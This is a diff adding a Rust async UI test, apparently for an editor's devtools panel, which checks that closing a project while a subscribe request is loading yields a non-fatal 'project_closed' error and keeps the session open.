+#[gpui::test]
+async fn a_project_closing_while_a_subscribe_loads_answers_project_closed(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let persisted = persisted_devtools_thread(&app, "/p/app", cx);
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let app_state = app.app_state();
+
+    handle_now(&panel, subscribe("s", &persisted), &app_state, cx);
+    app.cx.update(|window, _| window.remove_window());
+    cx.run_until_parked();
+    // The load ends however it ends — here the view outlives its window (this test holds the
+    // panel), so it waits out the connection timeout; what the panel is told is the project.
+    cx.executor()
+        .advance_clock(crate::devtools_threads::CONNECT_TIMEOUT + Duration::from_secs(1));
+    let got = panel.drain(cx);
+
+    let answer = reply(&got, "s");
+    assert_eq!(answer["kind"], "error", "{answer}");
+    assert_eq!(answer["error"], "project_closed", "R7.2: {answer}");
+    assert_eq!(answer["fatal"], false);
+    assert!(
+        !panel.closed(),
+        "R7.2: the session stays, ready for project_open"
+    );
+}
